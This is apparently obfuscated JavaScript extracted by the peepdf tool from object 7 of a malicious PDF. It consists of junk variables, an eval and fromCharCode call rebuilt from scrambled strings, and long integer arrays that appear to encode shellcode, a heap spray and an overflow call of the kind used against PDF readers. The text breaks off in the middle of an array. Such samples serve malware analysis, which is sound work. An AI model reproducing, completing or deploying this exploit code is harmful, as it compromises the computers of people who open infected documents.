// peepdf comment: Javascript code located in object 7 (version 0)

var njdpz = false;
gkqry = "";
cqtv = "cqtv";
aefmr = "";
flpw = 17449;
dmvx = "dmvx";
adgm = "";
jopr = true;
kmps = 3469;
var jnorty = "jnorty",
    dlmquv = 56151,
    fiqstx = 0,
    klovx = String,
    aciwy = klovx['f3r7ogmPCgh7aPr3Cgogdge3'.replace(/[3Eg7P]/g, '')],
    aelx = String,
    anrx = aelx['eQvNaNlO'.replace(/[ONpIQ]/g, '')],
    moruvw = "79",
    cflqw = "",
    efkmv = [68, 67, 64, 159, 172, 167, 154, 173, 160, 168, 165, 89, 157, 162, 175, 152, 160, 173, 95, 178, 152, 171, 170, 169, 99, 89, 163, 158, 165, 98, 178, 70, 65, 66, 64, 176, 159, 162, 163, 158, 87, 97, 176, 154, 169, 172, 167, 103, 163, 158, 165, 160, 171, 161, 87, 99, 87, 107, 87, 117, 87, 165, 156, 167, 96, 180, 68, 67, 64, 66, 64, 178, 152, 171, 170, 169, 87, 100, 116, 89, 176, 154, 169, 172, 167, 116, 68, 67, 64, 66, 180, 70, 65, 66, 64, 178, 152, 171, 170, 169, 87, 118, 87, 178, 152, 171, 170, 169, 101, 172, 172, 155, 170, 173, 169, 162, 165, 160, 95, 105, 99, 89, 163, 158, 165, 104, 105, 98, 114, 70, 65, 66, 64, 171, 156, 173, 172, 171, 165, 89, 176, 154, 169, 172, 167, 116, 68, 67, 64, 182, 68, 67, 68, 67, 64, 159, 172, 167, 154, 173, 160, 168, 165, 89, 172, 173, 160, 165, 150, 169, 169, 162, 165, 173, 157, 97, 96, 180, 68, 67, 64, 66, 173, 154, 169, 89, 167, 154, 176, 165, 166, 154, 155, 89, 116, 89, 172, 167, 156, 172, 154, 154, 167, 158, 95, 91, 92, 174, 124, 123, 124, 114, 92, 174, 103, 105, 103, 106, 92, 174, 108, 111, 103, 105, 92, 174, 120, 106, 109, 109, 92, 174, 103, 105, 106, 105, 92, 174, 103, 105, 103, 105, 92, 174, 107, 105, 111, 123, 92, 174, 111, 123, 103, 124, 92, 174, 104, 124, 110, 105, 92, 174, 111, 123, 120, 125, 92, 174, 103, 113, 107, 105, 92, 174, 122, 108, 108, 126, 92, 174, 111, 123, 108, 110, 92, 174, 111, 123, 124, 124, 92, 174, 103, 113, 107, 110, 92, 174, 106, 108, 108, 107, 92, 174, 122, 106, 123, 107, 92, 174, 103, 108, 122, 107, 92, 174, 104, 105, 106, 107, 92, 174, 111, 105, 107, 105, 92, 174, 103, 105, 106, 113, 92, 174, 125, 110, 110, 110, 92, 174, 122, 107, 111, 123, 92, 174, 108, 125, 108, 122, 92, 174, 103, 109, 122, 107, 92, 174, 108, 110, 103, 105, 92, 174, 124, 124, 111, 123, 92, 174, 108, 106, 108, 106, 92, 174, 108, 111, 108, 108, 92, 174, 109, 105, 108, 112, 92, 174, 108, 125, 111, 123, 92, 174, 106, 108, 103, 113, 92, 174, 111, 123, 122, 105, 92, 174, 103, 124, 110, 110, 92, 174, 125, 126, 111, 123, 92, 174, 110, 111, 103, 108, 92, 174, 111, 123, 106, 124, 92, 174, 110, 113, 107, 126, 92, 174, 122, 127, 103, 108, 92, 174, 108, 106, 111, 123, 92, 174, 108, 107, 104, 124, 92, 174, 108, 106, 111, 123, 92, 174, 108, 107, 105, 109, 92, 174, 110, 106, 111, 123, 92, 174, 107, 126, 104, 109, 92, 174, 110, 110, 111, 114, 92, 174, 111, 123, 125, 124, 92, 174, 105, 105, 110, 106, 92, 174, 125, 112, 103, 108, 92, 174, 107, 122, 112, 114, 92, 174, 107, 107, 120, 125, 92, 174, 106, 123, 109, 105, 92, 174, 125, 124, 108, 110, 92, 174, 103, 109, 110, 110, 92, 174, 122, 105, 106, 108, 92, 174, 106, 112, 124, 123, 92, 174, 125, 127, 106, 108, 92, 174, 107, 110, 103, 108, 92, 174, 112, 112, 103, 124, 92, 174, 122, 127, 111, 123, 92, 174, 110, 110, 120, 126, 92, 174, 105, 123, 125, 125, 92, 174, 107, 127, 125, 114, 92, 174, 124, 113, 108, 106, 92, 174, 125, 127, 112, 109, 92, 174, 125, 127, 125, 127, 92, 174, 122, 108, 106, 123, 92, 174, 110, 109, 109, 106, 92, 174, 124, 123, 103, 107, 92, 174, 111, 123, 123, 114, 92, 174, 103, 124, 107, 110, 92, 174, 108, 126, 112, 107, 92, 174, 125, 107, 103, 108, 92, 174, 124, 105, 123, 106, 92, 174, 122, 111, 103, 108, 92, 174, 122, 114, 106, 108, 92, 174, 121, 112, 103, 127, 92, 174, 108, 127, 103, 113, 92, 174, 124, 106, 122, 106, 92, 174, 103, 108, 103, 107, 92, 174, 103, 108, 122, 122, 92, 174, 111, 123, 122, 127, 92, 174, 103, 108, 103, 106, 92, 174, 111, 114, 122, 107, 92, 174, 125, 113, 107, 110, 92, 174, 111, 123, 109, 106, 92, 174, 125, 113, 107, 110, 92, 174, 108, 126, 108, 127, 92, 174, 122, 114, 108, 123, 92, 174, 108, 110, 122, 108, 92, 174, 124, 124, 111, 123, 92, 174, 124, 113, 108, 106, 92, 174, 125, 127, 107, 114, 92, 174, 125, 127, 125, 127, 92, 174, 109, 113, 108, 105, 92, 174, 109, 105, 124, 113, 92, 174, 103, 109, 121, 127, 92, 174, 109, 124, 124, 113, 92, 174, 125, 127, 125, 127, 92, 174, 106, 108, 125, 127, 92, 174, 108, 107, 123, 107, 92, 174, 125, 127, 108, 107, 92, 174, 103, 113, 110, 110, 92, 174, 123, 105, 125, 127, 92, 174, 107, 110, 111, 114, 92, 174, 111, 123, 125, 124, 92, 174, 125, 124, 107, 110, 92, 174, 122, 108, 122, 114, 92, 174, 111, 123, 108, 110, 92, 174, 111, 108, 124, 124, 92, 174, 103, 124, 124, 124, 92, 174, 107, 110, 111, 125, 92, 174, 108, 105, 125, 109, 92, 174, 107, 110, 122, 111, 92, 174, 110, 110, 125, 109, 92, 174, 107, 110, 122, 111, 92, 174, 110, 107, 125, 110, 92, 174, 107, 110, 122, 111, 92, 174, 109, 124, 125, 111, 92, 174, 107, 110, 122, 111, 92, 174, 109, 125, 125, 112, 92, 174, 107, 110, 122, 111, 92, 174, 109, 127, 125, 113, 92, 174, 107, 110, 122, 111, 92, 174, 109, 126, 125, 114, 92, 174, 107, 110, 122, 111, 92, 174, 105, 126, 125, 122, 92, 174, 107, 110, 122, 111, 92, 174, 109, 109, 125, 123, 92, 174, 107, 110, 122, 111, 92, 174, 109, 124, 125, 124, 92, 174, 107, 110, 122, 111, 92, 174, 109, 124, 125, 125, 92, 174, 107, 110, 122, 111, 92, 174, 103, 105, 125, 126, 92, 174, 120, 105, 124, 113, 92, 174, 125, 127, 125, 127, 92, 174, 108, 105, 125, 127, 92, 174, 108, 125, 109, 113, 92, 174, 104, 106, 111, 122, 92, 174, 124, 113, 104, 111, 92, 174, 125, 127, 104, 110, 92, 174, 125, 127, 125, 127, 92, 174, 122, 109, 111, 108, 92, 174, 111, 110, 103, 124, 92, 174, 110, 109, 122, 105, 92, 174, 109, 122, 104, 110, 92, 174, 109, 122, 103, 105, 92, 174, 125, 127, 103, 105, 92, 174, 103, 124, 110, 110, 92, 174, 110, 110, 125, 127, 92, 174, 109, 122, 103, 113, 92, 174, 125, 127, 103, 105, 92, 174, 111, 110, 123, 105, 92, 174, 110, 110, 122, 105, 92, 174, 107, 105, 103, 108, 92, 174, 122, 108, 122, 114, 92, 174, 122, 105, 106, 108, 92, 174, 122, 108, 122, 114, 92, 174, 106, 108, 108, 112, 92, 174, 111, 123, 122, 105, 92, 174, 105, 109, 107, 124, 92, 174, 111, 123, 103, 124, 92, 174, 105, 109, 110, 124, 92, 174, 125, 124, 103, 113, 92, 174, 120, 122, 125, 108, 92, 174, 122, 108, 108, 127, 92, 174, 107, 124, 111, 123, 92, 174, 103, 109, 105, 109, 92, 174, 106, 114, 111, 105, 92, 174, 111, 123, 103, 105, 92, 174, 110, 109, 122, 106, 92, 174, 107, 105, 103, 111, 92, 174, 106, 113, 111, 105, 92, 174, 110, 110, 103, 105, 92, 174, 105, 123, 125, 122, 92, 174, 122, 108, 122, 106, 92, 174, 111, 123, 108, 110, 92, 174, 111, 108, 124, 124, 92, 174, 109, 109, 124, 124, 92, 174, 111, 125, 108, 108, 92, 174, 125, 105, 107, 110, 92, 174, 106, 108, 108, 112, 92, 174, 108, 105, 123, 123, 92, 174, 107, 110, 122, 111, 92, 174, 109, 123, 125, 105, 92, 174, 107, 110, 122, 111, 92, 174, 109, 110, 125, 106, 92, 174, 107, 110, 122, 111, 92, 174, 110, 107, 125, 107, 92, 174, 107, 110, 122, 111, 92, 174, 109, 126, 125, 108, 92, 174, 107, 110, 122, 111, 92, 174, 109, 110, 125, 109, 92, 174, 107, 110, 122, 111, 92, 174, 109, 124, 125, 110, 92, 174, 107, 110, 122, 111, 92, 174, 106, 108, 125, 111, 92, 174, 107, 110, 122, 111, 92, 174, 106, 107, 125, 112, 92, 174, 107, 110, 122, 111, 92, 174, 105, 126, 125, 113, 92, 174, 107, 110, 122, 111, 92, 174, 109, 109, 125, 114, 92, 174, 107, 110, 122, 111, 92, 174, 109, 124, 125, 122, 92, 174, 107, 110, 122, 111, 92, 174, 109, 124, 125, 123, 92, 174, 108, 125, 111, 113, 92, 174, 124, 113, 125, 124, 92, 174, 125, 127, 103, 123, 92, 174, 125, 127, 125, 127, 92, 174, 109, 113, 108, 105, 92, 174, 107, 108, 109, 113, 92, 174, 111, 126, 125, 114, 92, 174, 111, 105, 124, 113, 92, 174, 125, 127, 125, 126, 92, 174, 111, 123, 125, 127, 92, 174, 111, 125, 125, 113, 92, 174, 112, 124, 107, 110, 92, 174, 107, 109, 109, 122, 92, 174, 124, 113, 108, 105, 92, 174, 125, 127, 110, 126, 92, 174, 125, 127, 125, 127, 92, 174, 107, 110, 111, 125, 92, 174, 109, 122, 124, 105, 92, 174, 108, 105, 104, 105, 92, 174, 110, 108, 124, 113, 92, 174, 125, 127, 125, 127, 92, 174, 111, 108, 125, 127, 92, 174, 104, 124, 122, 109, 92, 174, 107, 110, 111, 125, 92, 174, 108, 105, 124, 105, 92, 174, 107, 110, 111, 125, 92, 174, 108, 105, 112, 124, 92, 174, 108, 108, 108, 108, 92, 174, 108, 108, 108, 108, 92, 174, 108, 108, 108, 108, 92, 174, 110, 110, 125, 127, 92, 174, 122, 112, 103, 113, 92, 174, 112, 124, 107, 110, 92, 174, 103, 105, 107, 109, 92, 174, 103, 105, 103, 105, 92, 174, 125, 127, 108, 108, 92, 174, 108, 127, 123, 112, 92, 174, 121, 111, 103, 127, 92, 174, 108, 123, 122, 105, 92, 174, 122, 108, 122, 114, 92, 174, 111, 123, 108, 110, 92, 174, 108, 106, 124, 124, 92, 174, 108, 108, 108, 106, 92, 174, 108, 112, 108, 111, 92, 174, 107, 107, 109, 122, 92, 174, 110, 107, 124, 113, 92, 174, 103, 105, 103, 105, 92, 174, 111, 123, 103, 105, 92, 174, 106, 108, 123, 113, 92, 174, 111, 110, 125, 111, 92, 174, 108, 114, 123, 123, 92, 174, 107, 110, 122, 112, 92, 174, 109, 106, 125, 113, 92, 174, 109, 110, 105, 126, 92, 174, 122, 112, 110, 113, 92, 174, 125, 124, 107, 110, 92, 174, 103, 105, 109, 110, 92, 174, 103, 105, 103, 105, 92, 174, 108, 111, 110, 126, 92, 174, 107, 110, 111, 125, 92, 174, 108, 105, 125, 113, 92, 174, 124, 113, 108, 111, 92, 174, 103, 105, 108, 106, 92, 174, 103, 105, 103, 105, 92, 174, 108, 105, 108, 114, 92, 174, 121, 106, 124, 113, 92, 174, 125, 127, 125, 126, 92, 174, 111, 110, 125, 127, 92, 174, 108, 114, 122, 105, 92, 174, 110, 109, 108, 114, 92, 174, 111, 125, 106, 114, 92, 174, 103, 106, 107, 111, 92, 174, 124, 113, 108, 105, 92, 174, 103, 105, 106, 123, 92, 174, 103, 105, 103, 105, 92, 174, 125, 113, 111, 123, 92, 174, 107, 110, 111, 125, 92, 174, 108, 105, 125, 113, 92, 174, 105, 106, 124, 113, 92, 174, 125, 127, 125, 127, 92, 174, 111, 110, 125, 127, 92, 174, 108, 114, 122, 105, 92, 174, 110, 109, 108, 114, 92, 174, 108, 112, 103, 124, 92, 174, 103, 106, 124, 113, 92, 174, 125, 127, 125, 127, 92, 174, 108, 114, 125, 127, 92, 174, 107, 109, 122, 111, 92, 174, 125, 127, 106, 113, 92, 174, 108, 105, 110, 108, 92, 174, 107, 110, 111, 125, 92, 174, 125, 126, 125, 113, 92, 174, 108, 113, 103, 105, 92, 174, 107, 110, 111, 125, 92, 174, 108, 105, 125, 113, 92, 174, 124, 113, 108, 112, 92, 174, 125, 126, 110, 109, 92, 174, 125, 127, 125, 127, 92, 174, 108, 114, 108, 114, 92, 174, 107, 111, 107, 111, 92, 174, 125, 108, 106, 123, 92, 174, 120, 122, 110, 124, 92, 174, 108, 126, 108, 127, 92, 174, 122, 114, 108, 123, 92, 174, 108, 110, 122, 108, 92, 174, 124, 124, 111, 123, 92, 174, 108, 108, 108, 106, 92, 174, 109, 105, 109, 111, 92, 174, 106, 107, 121, 106, 92, 174, 103, 105, 124, 113, 92, 174, 103, 105, 103, 105, 92, 174, 108, 113, 103, 105, 92, 174, 103, 113, 106, 113, 92, 174, 103, 108, 110, 109, 92, 174, 124, 123, 107, 105, 92, 174, 107, 105, 125, 114, 92, 174, 108, 125, 111, 123, 92, 174, 111, 105, 103, 113, 92, 174, 107, 107, 125, 123, 92, 174, 103, 113, 110, 110, 92, 174, 123, 123, 106, 108, 92, 174, 104, 113, 111, 122, 92, 174, 122, 108, 111, 123, 92, 174, 104, 112, 124, 123, 92, 174, 104, 113, 106, 113, 92, 174, 104, 106, 110, 111, 92, 174, 106, 108, 107, 105, 92, 174, 111, 109, 122, 114, 92, 174, 110, 109, 123, 123, 92, 174, 107, 105, 103, 124, 92, 174, 103, 113, 106, 113, 92, 174, 125, 123, 110, 110, 92, 174, 125, 126, 107, 105, 92, 174, 124, 123, 122, 123, 92, 174, 106, 108, 125, 107, 92, 174, 111, 114, 122, 105, 92, 174, 125, 124, 107, 110, 92, 174, 107, 110, 111, 123, 92, 174, 108, 123, 125, 124, 92, 174, 122, 108, 122, 114, 92, 174, 103, 106, 106, 107, 92, 174, 110, 109, 109, 113, 92, 174, 110, 105, 110, 109, 92, 174, 105, 127, 106, 122, 92, 174, 109, 125, 105, 127, 92, 174, 110, 108, 109, 127, 92, 174, 109, 127, 109, 108, 92, 174, 106, 109, 110, 112, 92, 174, 109, 114, 109, 108, 92, 174, 110, 114, 110, 109, 92, 174, 109, 114, 105, 126, 92, 174, 109, 111, 109, 126, 92, 174, 105, 127, 109, 127, 92, 174, 109, 124, 110, 108, 92, 174, 109, 110, 109, 110, 92, 174, 105, 127, 110, 105, 92, 174, 109, 110, 109, 106, 92, 174, 110, 108, 109, 122, 92, 174, 106, 107, 110, 109, 92, 174, 109, 110, 105, 126, 92, 174, 109, 110, 110, 113, 92, 174, 103, 105, 103, 105, 89, 98, 114, 70, 65, 66, 64, 175, 152, 171, 87, 167, 166, 169, 87, 118, 87, 174, 165, 158, 170, 156, 152, 169, 156, 97, 89, 94, 172, 105, 120, 105, 120, 94, 172, 105, 120, 105, 120, 94, 172, 105, 120, 105, 120, 94, 172, 105, 120, 105, 120, 91, 96, 70, 65, 66, 64, 175, 152, 171, 87, 161, 156, 154, 167, 155, 163, 168, 154, 164, 87, 118, 87, 167, 166, 169, 87, 100, 87, 169, 152, 178, 163, 168, 152, 157, 114, 70, 65, 66, 64, 175, 152, 171, 87, 155, 160, 160, 153, 165, 166, 156, 162, 89, 116, 89, 172, 167, 156, 172, 154, 154, 167, 158, 95, 91, 92, 174, 103, 122, 103, 122, 92, 174, 103, 122, 103, 122, 89, 98, 114, 70, 65, 66, 64, 175, 152, 171, 87, 161, 156, 154, 155, 158, 169, 172, 160, 179, 156, 89, 116, 89, 105, 105, 114, 70, 65, 66, 64, 175, 152, 171, 87, 172, 167, 171, 152, 178, 87, 118, 87, 161, 156, 154, 155, 158, 169, 172, 160, 179, 156, 89, 98, 89, 159, 158, 152, 169, 153, 165, 166, 156, 162, 103, 163, 158, 165, 160, 171, 161, 114, 70, 65, 66, 64, 176, 159, 162, 163, 158, 87, 97, 153, 162, 158, 155, 163, 168, 154, 164, 101, 165, 156, 167, 158, 173, 159, 89, 115, 89, 170, 169, 169, 154, 176, 98, 178, 70, 65, 66, 64, 66, 153, 162, 158, 155, 163, 168, 154, 164, 87, 100, 116, 89, 153, 162, 158, 155, 163, 168, 154, 164, 114, 70, 65, 66, 64, 182, 68, 67, 64, 66, 173, 154, 169, 89, 157, 162, 163, 165, 153, 165, 166, 156, 162, 89, 116, 89, 153, 162, 158, 155, 163, 168, 154, 164, 101, 172, 172, 155, 170, 173, 169, 162, 165, 160, 95, 105, 99, 89, 170, 169, 169, 154, 176, 98, 114, 70, 65, 66, 64, 175, 152, 171, 87, 155, 163, 168, 154, 164, 87, 118, 87, 155, 160, 160, 153, 165, 166, 156, 162, 103, 170, 174, 153, 172, 171, 171, 160, 167, 158, 97, 103, 101, 87, 155, 160, 160, 153, 165, 166, 156, 162, 103, 163, 158, 165, 160, 171, 161, 100, 172, 167, 171, 152, 178, 96, 116, 68, 67, 64, 66, 174, 161, 160, 165, 156, 89, 95, 155, 163, 168, 154, 164, 101, 165, 156, 167, 158, 173, 159, 100, 170, 169, 169, 154, 176, 89, 115, 89, 103, 177, 107, 105, 103, 105, 103, 98, 178, 70, 65, 66, 64, 66, 153, 165, 166, 156, 162, 89, 116, 89, 153, 165, 166, 156, 162, 89, 98, 89, 153, 165, 166, 156, 162, 89, 98, 89, 157, 162, 163, 165, 153, 165, 166, 156, 162, 116, 68, 67, 64, 66, 180, 70, 65, 66, 64, 175, 152, 171, 87, 166, 156, 166, 150, 154, 169, 171, 152, 178, 87, 118, 87, 167, 156, 176, 87, 122, 169, 171, 152, 178, 95, 98, 114, 70, 65, 66, 64, 159, 166, 171, 87, 97, 173, 154, 169, 89, 160, 89, 116, 89, 103, 116, 87, 162, 87, 117, 87, 106, 107, 105, 103, 116, 87, 162, 98, 100, 96, 180, 68, 67, 64, 66, 64, 166, 156, 166, 150, 154, 169, 171, 152, 178, 146, 162, 148, 89, 116, 89, 153, 165, 166, 156, 162, 89, 98, 89, 159, 158, 152, 169, 153, 165, 166, 156, 162, 116, 68, 67, 64, 66, 180, 70, 65, 66, 64, 175, 152, 171, 87, 167, 172, 166, 87, 118, 87, 106, 105, 114, 112, 114, 112, 114, 112, 114, 112, 114, 112, 114, 112, 114, 112, 114, 112, 114, 112, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 113, 111, 116, 68, 67, 64, 66, 172, 173, 160, 165, 101, 169, 169, 162, 165, 173, 157, 97, 89, 94, 107, 110, 103, 105, 103, 159, 89, 101, 87, 167, 172, 166, 96, 116, 68, 67, 64, 182, 68, 67, 68, 67, 64, 159, 172, 167, 154, 173, 160, 168, 165, 89, 154, 168, 163, 165, 152, 155, 150, 158, 164, 154, 160, 165, 95, 98, 178, 70, 65, 66, 64, 175, 152, 171, 87, 172, 159, 158, 163, 165, 154, 168, 155, 158, 87, 118, 87, 174, 165, 158, 170, 156, 152, 169, 156, 97, 89, 94, 172, 126, 121, 126, 112, 94, 172, 105, 103, 105, 104, 94, 172, 110, 109, 105, 103, 94, 172, 122, 104, 111, 107, 94, 172, 105, 103, 108, 103, 94, 172, 105, 103, 105, 103, 94, 172, 109, 103, 113, 121, 94, 172, 113, 121, 105, 122, 94, 172, 106, 122, 112, 103, 94, 172, 113, 121, 122, 123, 94, 172, 105, 111, 109, 103, 94, 172, 124, 106, 110, 124, 94, 172, 113, 121, 110, 108, 94, 172, 113, 121, 126, 122, 94, 172, 105, 111, 109, 108, 94, 172, 108, 106, 110, 105, 94, 172, 124, 104, 125, 105, 94, 172, 105, 106, 124, 105, 94, 172, 106, 103, 108, 105, 94, 172, 113, 103, 109, 103, 94, 172, 105, 103, 108, 111, 94, 172, 127, 108, 112, 108, 94, 172, 124, 105, 113, 121, 94, 172, 110, 123, 110, 120, 94, 172, 105, 107, 124, 105, 94, 172, 110, 108, 105, 103, 94, 172, 126, 122, 113, 121, 94, 172, 110, 104, 110, 104, 94, 172, 110, 109, 110, 106, 94, 172, 111, 103, 110, 110, 94, 172, 110, 123, 113, 121, 94, 172, 108, 106, 105, 111, 94, 172, 113, 121, 124, 103, 94, 172, 105, 122, 112, 108, 94, 172, 127, 124, 113, 121, 94, 172, 112, 109, 105, 106, 94, 172, 113, 121, 108, 122, 94, 172, 112, 111, 109, 124, 94, 172, 124, 125, 105, 106, 94, 172, 110, 104, 113, 121, 94, 172, 110, 105, 106, 122, 94, 172, 110, 104, 113, 121, 94, 172, 110, 105, 107, 107, 94, 172, 112, 104, 113, 121, 94, 172, 109, 124, 106, 107, 94, 172, 112, 108, 113, 112, 94, 172, 113, 121, 127, 122, 94, 172, 107, 103, 112, 104, 94, 172, 127, 110, 105, 106, 94, 172, 109, 120, 114, 112, 94, 172, 109, 105, 122, 123, 94, 172, 108, 121, 111, 103, 94, 172, 127, 122, 110, 108, 94, 172, 105, 107, 112, 108, 94, 172, 124, 103, 108, 106, 94, 172, 108, 110, 126, 121, 94, 172, 127, 125, 108, 106, 94, 172, 109, 108, 105, 106, 94, 172, 114, 110, 105, 122, 94, 172, 124, 125, 113, 121, 94, 172, 112, 108, 122, 124, 94, 172, 107, 121, 127, 123, 94, 172, 109, 125, 127, 112, 94, 172, 126, 111, 110, 104, 94, 172, 127, 125, 114, 107, 94, 172, 127, 125, 127, 125, 94, 172, 124, 106, 108, 121, 94, 172, 112, 107, 111, 104, 94, 172, 126, 121, 105, 105, 94, 172, 113, 121, 125, 112, 94, 172, 105, 122, 109, 108, 94, 172, 110, 124, 114, 105, 94, 172, 127, 105, 105, 106, 94, 172, 126, 103, 125, 104, 94, 172, 124, 109, 105, 106, 94, 172, 124, 112, 108, 106, 94, 172, 123, 110, 105, 125, 94, 172, 110, 125, 105, 111, 94, 172, 126, 104, 124, 104, 94, 172, 105, 106, 105, 105, 94, 172, 105, 106, 124, 120, 94, 172, 113, 121, 124, 125, 94, 172, 105, 106, 105, 104, 94, 172, 113, 112, 124, 105, 94, 172, 127, 111, 109, 108, 94, 172, 113, 121, 111, 104, 94, 172, 127, 111, 109, 108, 94, 172, 110, 124, 110, 125, 94, 172, 124, 112, 110, 121, 94, 172, 110, 108, 124, 106, 94, 172, 126, 122, 113, 121, 94, 172, 126, 111, 110, 104, 94, 172, 127, 125, 109, 112, 94, 172, 127, 125, 127, 125, 94, 172, 111, 111, 110, 103, 94, 172, 111, 103, 126, 111, 94, 172, 105, 107, 123, 125, 94, 172, 111, 122, 126, 111, 94, 172, 127, 125, 127, 125, 94, 172, 108, 106, 127, 125, 94, 172, 110, 105, 125, 105, 94, 172, 127, 125, 110, 105, 94, 172, 105, 111, 112, 108, 94, 172, 125, 103, 127, 125, 94, 172, 109, 108, 113, 112, 94, 172, 113, 121, 127, 122, 94, 172, 127, 122, 109, 108, 94, 172, 124, 106, 124, 112, 94, 172, 113, 121, 110, 108, 94, 172, 113, 106, 126, 122, 94, 172, 105, 122, 126, 122, 94, 172, 109, 108, 113, 123, 94, 172, 110, 103, 127, 107, 94, 172, 109, 108, 124, 109, 94, 172, 112, 108, 127, 107, 94, 172, 109, 108, 124, 109, 94, 172, 112, 105, 127, 108, 94, 172, 109, 108, 124, 109, 94, 172, 111, 122, 127, 109, 94, 172, 109, 108, 124, 109, 94, 172, 111, 123, 127, 110, 94, 172, 109, 108, 124, 109, 94, 172, 111, 125, 127, 111, 94, 172, 109, 108, 124, 109, 94, 172, 111, 124, 127, 112, 94, 172, 109, 108, 124, 109, 94, 172, 107, 124, 127, 120, 94, 172, 109, 108, 124, 109, 94, 172, 111, 107, 127, 121, 94, 172, 109, 108, 124, 109, 94, 172, 111, 122, 127, 122, 94, 172, 109, 108, 124, 109, 94, 172, 111, 122, 127, 123, 94, 172, 109, 108, 124, 109, 94, 172, 105, 103, 127, 124, 94, 172, 122, 103, 126, 111, 94, 172, 127, 125, 127, 125, 94, 172, 110, 103, 127, 125, 94, 172, 110, 123, 111, 111, 94, 172, 106, 104, 113, 120, 94, 172, 126, 111, 106, 109, 94, 172, 127, 125, 106, 108, 94, 172, 127, 125, 127, 125, 94, 172, 124, 107, 113, 106, 94, 172, 113, 108, 105, 122, 94, 172, 112, 107, 124, 103, 94, 172, 111, 120, 106, 108, 94, 172, 111, 120, 105, 103, 94, 172, 127, 125, 105, 103, 94, 172, 105, 122, 112, 108, 94, 172, 112, 108, 127, 125, 94, 172, 111, 120, 105, 111, 94, 172, 127, 125, 105, 103, 94, 172, 113, 108, 125, 103, 94, 172, 112, 108, 124, 103, 94, 172, 109, 103, 105, 106, 94, 172, 124, 106, 124, 112, 94, 172, 124, 103, 108, 106, 94, 172, 124, 106, 124, 112, 94, 172, 108, 106, 110, 110, 94, 172, 113, 121, 124, 103, 94, 172, 107, 107, 109, 122, 94, 172, 113, 121, 105, 122, 94, 172, 107, 107, 112, 122, 94, 172, 127, 122, 105, 111, 94, 172, 122, 120, 127, 106, 94, 172, 124, 106, 110, 125, 94, 172, 109, 122, 113, 121, 94, 172, 105, 107, 107, 107, 94, 172, 108, 112, 113, 103, 94, 172, 113, 121, 105, 103, 94, 172, 112, 107, 124, 104, 94, 172, 109, 103, 105, 109, 94, 172, 108, 111, 113, 103, 94, 172, 112, 108, 105, 103, 94, 172, 107, 121, 127, 120, 94, 172, 124, 106, 124, 104, 94, 172, 113, 121, 110, 108, 94, 172, 113, 106, 126, 122, 94, 172, 111, 107, 126, 122, 94, 172, 113, 123, 110, 106, 94, 172, 127, 103, 109, 108, 94, 172, 108, 106, 110, 110, 94, 172, 110, 103, 125, 121, 94, 172, 109, 108, 124, 109, 94, 172, 111, 121, 127, 103, 94, 172, 109, 108, 124, 109, 94, 172, 111, 108, 127, 104, 94, 172, 109, 108, 124, 109, 94, 172, 112, 105, 127, 105, 94, 172, 109, 108, 124, 109, 94, 172, 111, 124, 127, 106, 94, 172, 109, 108, 124, 109, 94, 172, 111, 108, 127, 107, 94, 172, 109, 108, 124, 109, 94, 172, 111, 122, 127, 108, 94, 172, 109, 108, 124, 109, 94, 172, 108, 106, 127, 109, 94, 172, 109, 108, 124, 109, 94, 172, 108, 105, 127, 110, 94, 172, 109, 108, 124, 109, 94, 172, 107, 124, 127, 111, 94, 172, 109, 108, 124, 109, 94, 172, 111, 107, 127, 112, 94, 172, 109, 108, 124, 109, 94, 172, 111, 122, 127, 120, 94, 172, 109, 108, 124, 109, 94, 172, 111, 122, 127, 121, 94, 172, 110, 123, 113, 111, 94, 172, 126, 111, 127, 122, 94, 172, 127, 125, 105, 121, 94, 172, 127, 125, 127, 125, 94, 172, 111, 111, 110, 103, 94, 172, 109, 106, 111, 111, 94, 172, 113, 124, 127, 112, 94, 172, 113, 103, 126, 111, 94, 172, 127, 125, 127, 124, 94, 172, 113, 121, 127, 125, 94, 172, 113, 123, 127, 111, 94, 172, 114, 122, 109, 108, 94, 172, 109, 107, 111, 120, 94, 172, 126, 111, 110, 103, 94, 172, 127, 125, 112, 124, 94, 172, 127, 125, 127, 125, 94, 172, 109, 108, 113, 123, 94, 172, 111, 120, 126, 103, 94, 172, 110, 103, 106, 103, 94, 172, 112, 106, 126, 111, 94, 172, 127, 125, 127, 125, 94, 172, 113, 106, 127, 125, 94, 172, 106, 122, 124, 107, 94, 172, 109, 108, 113, 123, 94, 172, 110, 103, 126, 103, 94, 172, 109, 108, 113, 123, 94, 172, 110, 103, 114, 122, 94, 172, 110, 106, 110, 106, 94, 172, 110, 106, 110, 106, 94, 172, 110, 106, 110, 106, 94, 172, 112, 108, 127, 125, 94, 172, 124, 110, 105, 111, 94, 172, 114, 122, 109, 108, 94, 172, 105, 103, 109, 107, 94, 172, 105, 103, 105, 103, 94, 172, 127, 125, 110, 106, 94, 172, 110, 125, 125, 110, 94, 172, 123, 109, 105, 125, 94, 172, 110, 121, 124, 103, 94, 172, 124, 106, 124, 112, 94, 172, 113, 121, 110, 108, 94, 172, 110, 104, 126, 122, 94, 172, 110, 